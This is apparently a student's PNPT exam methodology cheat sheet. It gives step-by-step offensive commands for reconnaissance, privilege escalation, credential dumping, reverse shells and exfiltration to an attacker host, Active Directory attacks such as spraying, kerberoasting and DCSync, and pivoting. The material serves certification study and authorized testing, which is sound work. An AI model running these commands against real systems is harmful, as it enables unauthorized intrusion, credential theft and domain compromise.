# PNPT Methodology

The whole chain in one line:

> OSINT → scan → web foothold → privesc → loot → pivot → AD → Domain Admin → report

Placeholders I use below: `TARGET` = target IP, `KALI` = my attacker IP, `DC_IP` = domain controller, `DOMAIN` = domain name, `USER`/`PASS` = creds. New session on the exam = re-check my tun0 IP first (`ip a`).

---

## 1. OSINT

Learn the target before touching it. Find domains, emails, employees, the tech stack. Build a username list for spraying later.

```bash
whois DOMAIN.com
theHarvester -d DOMAIN.com -b all
sublist3r -d DOMAIN.com          # subdomains
```

## 2. Scan & Enumerate

Find open ports, then version/script scan only what's open. Then dig into the big services.

```bash
nmap -Pn -p- -T4 TARGET -oA scan          # all ports, skip ping
nmap -Pn -sV -sC -p <open_ports> TARGET   # version + default scripts
smbclient -L //TARGET -N                  # list shares, null session
nxc smb TARGET -u '' -p ''                # netexec null auth
```

> ⚠ Windows blocks ping. A "host seems down" almost always means use `-Pn`, not a dead box. I lost time on this once — not again.

## 3. Web & Foothold

Break in and land a (usually weak) shell. Dir-bust, fingerprint, then hunt the usual bugs: default creds, SQLi, file upload, LFI/RFI, command injection, known CVE on the version you found.

```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nikto -h http://TARGET
searchsploit <software> <version>
sqlmap -u 'http://TARGET/page?id=1' --batch --dbs
```

> ⚠ PNPT caps Metasploit auto-exploit at **one** use. Do the rest manually.

## 4. Linux Privilege Escalation

Weak user → root. Enumerate first, read the output, then exploit what you find. [GTFOBins](https://gtfobins.github.io) is the reference.

```bash
id ; sudo -l ; uname -a ; cat /etc/os-release
find / -perm -4000 2>/dev/null     # SUID binaries
cat /etc/crontab                   # cron jobs
```

Common wins:
- `sudo -l` shows a binary → GTFOBins (e.g. `sudo find . -exec /bin/sh \; -quit`)
- SUID bash/cp/find → `bash -p`, or `cp` a payload over a root-owned file
- writable `/etc/passwd` or `/etc/shadow` → add a root line / crack with john
- cron runs a writable script → put the payload **inside** the script
- tar wildcard → `--checkpoint=1 --checkpoint-action=exec=sh shell.sh`

> ⚠ The payload goes **inside** the file (nano). The `echo | sudo tee` command runs **at** the terminal (`$`). Mixing these up cost me a whole session once.

## 5. Windows Privilege Escalation

Weak user → SYSTEM. Two buckets: doors (misconfigured permissions on services/files/registry) and badges (token privileges you carry).

```cmd
whoami /priv            :: SeImpersonate here = Potato -> SYSTEM
whoami /groups
accesschk.exe /accepteula -uwcqv USER *
```

Common wins:
- weak service perms → `sc config <svc> binpath= "net localgroup administrators USER /add"` then stop/start
- unquoted service path → drop an exe in the writable gap (`C:\Program.exe`)
- AutoRuns (writable) → overwrite the autorun exe, wait for an admin login
- AlwaysInstallElevated → malicious `.msi` via `msiexec /quiet /i evil.msi` (needs both HKCU + HKLM = 1)
- saved creds → `cmdkey /list` then `runas /savecred /user:admin <payload>`

> ⚠ `whoami /priv` shows SeImpersonate → Potato → SYSTEM (GodPotato / PrintSpoofer). That's the trigger to memorize.

## 6. Credential Access

Grab hashes and reuse them. The SAM needs the SYSTEM hive with it — one holds the hashes, the other holds the key to decrypt them.

```bash
# on target (backups also live in C:\Windows\Repair\):
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
# transfer both to Kali (phase 7), then:
secretsdump.py -sam sam.bak -system system.bak LOCAL
hashcat -m 1000 <NThash> /usr/share/wordlists/rockyou.txt
# or skip cracking — pass the hash:
impacket-psexec -hashes :NTHASH administrator@TARGET
evil-winrm -i TARGET -u administrator -H NTHASH
```

> ⚠ `hashcat -m 1000` wants **only the NT hash** (the 4th field). The `aad3b435...` LM part is dead — don't feed it. I hit the "token length exception" doing exactly that.

## 7. Reverse Shells & File Transfer

Move tools onto the target and loot back off it.

```bash
# build + catch a reverse shell (start the listener FIRST):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f exe -o rev.exe
nc -nvlp 4444

# Kali -> Windows (download onto target):
#   Kali:    python3 -m http.server 80
#   Windows: certutil -urlcache -split -f http://KALI/rev.exe C:\Temp\rev.exe

# Windows -> Kali (steal loot out):
#   Kali:    smbserver.py share . -smb2support -user red -password red
#   Windows: net use \\KALI\share /user:red red
#            copy C:\loot\sam.bak \\KALI\share\
```

> ⚠ URLs use forward slashes `//`. Windows paths use back slashes `\`. The command has both, right next to each other. Modern Windows also blocks anonymous SMB, so the share needs a username/password.

## 8. Active Directory

One user → Domain Admin. Poison, map, spray, roast.

```bash
responder -I tun0 -dwPv
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt       # NetNTLMv2
nxc ldap DOMAIN -u USER -p PASS --bloodhound --dns-server DC_IP -c all
nxc smb 10.0.0.0/24 -u users.txt -p 'Season2026!' --continue-on-success   # spray
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request     # kerberoast  (-m 13100)
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP   # AS-REP  (-m 18200)
impacket-secretsdump DOMAIN/USER:PASS@DC_IP                     # DCSync, all domain hashes
```

## 9. Pivoting

Reach machines you can't touch directly. Check the host you own for a second network first — if there is one, tunnel through it.

```bash
ipconfig    # or: ip a / arp -a   — a second subnet means pivot
ssh -D 9050 user@PIVOT_HOST       # SOCKS proxy
# then in /etc/proxychains.conf:  socks4 127.0.0.1 9050
proxychains nmap -sT -Pn INTERNAL_IP
proxychains impacket-psexec ...
```

## 10. Post-Exploitation

Prove impact and collect evidence. Dump all hashes, hunt for sensitive files, screenshot proof (whoami on each owned host, DA on the DC).

```bash
# files worth hunting:
#   *.kdbx  *.config  web.config  unattend.xml  .ssh/id_rsa  *.bak  bash_history
```

## 11. Report & Debrief

This is the actual test. Write every finding the same way:

- **Finding** — what's wrong, with the exact location.
- **Impact** — who can exploit it → what they get → how far it spreads (reuse, lateral movement).
- **Remediation** — the concrete fix.

Then prep the live debrief and explain the whole chain out loud, calmly.

> ⚠ The PNPT is passed by explaining clearly, not just by hacking. I practice the debrief out loud every week.
